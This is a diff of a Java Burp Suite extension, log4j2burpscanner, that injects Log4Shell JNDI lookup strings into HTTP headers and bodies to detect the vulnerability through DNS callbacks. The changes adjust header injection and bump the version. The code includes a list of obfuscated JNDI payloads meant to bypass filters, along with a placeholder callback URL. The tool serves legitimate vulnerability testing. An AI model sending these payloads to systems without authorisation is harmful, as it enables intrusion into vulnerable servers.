@@ -224,7 +224,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     fileWriter.append("\n");
                     fileWriter.append("whitelists=*.gov.cn、*.edu.cn");
                     fileWriter.append("\n");
-                    fileWriter.append("customlists=X-Client-IP、X-Forwarded-For、X-Api-Version");
+                    fileWriter.append("customlists=X-Client-IP、X-Requested-With、X-Api-Version");
                     fileWriter.append("\n");
                     fileWriter.append("isuseUserAgentTokenXff=1");
                     fileWriter.append("\n");
@@ -314,7 +314,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
         callbacks.setExtensionName("log4j2burpscanner");
         this.stdout.println("===========================");
         this.stdout.println("[+]   load successful!     ");
-        this.stdout.println("[+] log4j2burpscanner v0.18.3");
+        this.stdout.println("[+] log4j2burpscanner v0.18.5");
         this.stdout.println("[+]      code by f0ng      ");
         this.stdout.println("===========================");
 
@@ -483,7 +483,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         field33.setLineWrap(true);
                         field33.setText("http://x.x.x.x/repoonsetoken=[token]");
                         whitelists_area.setText("*.gov.cn\n*.edu.cn");
-                        customheaders_area.setText("X-Client-IP\nX-Forwarded-For\nX-Api-Version");
+                        customheaders_area.setText("X-Client-IP\nX-Requested-With\nX-Api-Version");
                     }
                 });
 
@@ -947,7 +947,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                         field33.setLineWrap(true);
                         field33.setText("http://x.x.x.x/repoonsetoken=[token]");
                         whitelists_area.setText("*.gov.cn\n*.edu.cn");
-                        customheaders_area.setText("X-Client-IP\nX-Forwarded-For\nX-Api-Version");
+                        customheaders_area.setText("X-Client-IP\nX-Requested-With\nX-Api-Version");
                     }
                 });
 
@@ -1224,6 +1224,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
             if ( !BurpExtender.this.log4j2passivepattern_box.isSelected() ) // 关闭被动扫描
                 return null;
+
+//            if ( !BurpExtender.this.)
+
+
 
             if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0"))
                 return null;
@@ -1582,9 +1586,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
             }
 
-            if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-            }
+//            if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
+//                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
+//            }
 
 
             if (request_header.get(i).contains("X-Api-Version:") && this.isuseUserAgentTokenXff){
@@ -1661,7 +1665,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 //            stdout.println("1238");
 //            stdout.println(request_header.get(0));
-        if ( headers_lists.length > 0 ) { // 判断自定义参数不为空
+        if ( headers_lists.length > 0 && !headers_lists[0].equals("") ) { // 判断自定义参数不为空   加上了判断index为0不为空的状态
             for (String headers_host_single : headers_lists) // 白名单设置
             {
                 if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
@@ -1669,8 +1673,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             }
         }
         // 参数头由于参数问题，XFF头 如果没有参数，还会自动加上
-//        if (!request_header.contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff) // 如果没有xff头，就增加
-//            request_header.add( "X-Forwarded-For: 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
+        if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
+            request_header.add( "X-Forwarded-For: 127.0.0.1 ," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
 //
 //        if (!request_header.contains("X-Client-IP:") && this.isuseUserAgentTokenXff) // 如果没有x-client-ip头，就增加
 //            request_header.add( "X-Client-IP: 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
@@ -1759,7 +1763,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 //                vulnurl = vulnurl.replace(ij - 1 +"." + this.logxn_dnslog, ij + "." + this.logxn_dnslog);
 //                body = body.replace(ij - 1 + "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$");
                 for(int jji = 0 ;jji < request_header_single.size(); jji++){
-                    stdout.println(request_header_single.get(jji));
+//                    stdout.println(request_header_single.get(jji));
                     request_header_single.set(jji,request_header_single.get(jji).replace(  "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$"));
                 }
             }
@@ -2114,7 +2118,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 this.jndiparam = FileGetValue(f,"jndiparam").trim();
 
                 if (this.logxn_dnslog.contains("configure ceye api") && output.contains("isuseceye=0") && output.contains("isuseprivatedns=0")) {
-                    stdout.println("1");
+//                    stdout.println("1");
                     return;
                 }
 
@@ -2447,9 +2451,9 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                     request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
                 }
 
-                if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-                }
+//                if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
+//                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
+//                }
 
                 // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
                 if (request_header.get(i).contains("Content-Type:") && this.isuseContenttype)
@@ -2523,7 +2527,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
 
 //            stdout.println("1238");
 //            stdout.println(request_header.get(0));
-            if ( headers_lists.length > 0 ) { // 判断自定义参数不为空
+
+            if ( headers_lists.length > 0 && !headers_lists[0].equals("") ) { // 判断自定义参数不为空
                 for (String headers_host_single : headers_lists) // 白名单设置
                 {
                     if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
@@ -2531,6 +2536,8 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                 }
             }
 
+            if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
+                request_header.add( "X-Forwarded-For: 127.0.0.1 ," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
 
             // 如果没有参数，那么将不会测试
 //            if (!request_header.contains("Content-Type:") && this.isuseRefererOrigin)
@@ -2589,6 +2596,7 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
             // jndi_lists 参数bypass绕过列表
             // request_bodys_lists 为请求体的列表
             List<String> jndi_lists = Arrays.asList("jndi:","j$%7b::-n%7ddi:", "jn$%7benv::-%7ddi:","j$%7bsys:k5:-nD%7d$%7blower:i$%7bweb:k5:-:%7d%7d");
+//            List<String> jndi_lists = Arrays.asList("jndi:");
 //                    "j$%7b::-nD%7di$%7b::-:%7d", "j$%7bEnV:K5:-nD%7di:");
 
             List<String> random_lists = new ArrayList();
@@ -2677,10 +2685,10 @@ public class BurpExtender extends AbstractTableModel implements IBurpExtender, I
                             newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
 
                         }else if(ij == 3 && this.isipincreasing){
-                            request_bodys = code_body.getBytes();  //String to byte[] 原始请求体
+                            request_bodys = finalBody.getBytes();  //String to byte[] 原始请求体
                             newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
                         }else{
-                            request_bodys = finalBody.getBytes();  //String to byte[]
+                            request_bodys = code_body.getBytes();  //String to byte[]
                             newRequest = BurpExtender.this.helpers.buildHttpMessage(request_header_single, request_bodys);
                         }
 
@@ -3091,4 +3099,7 @@ class CustomScanIssue implements IScanIssue
     {
         return httpService;
     }
+
+
+
 }
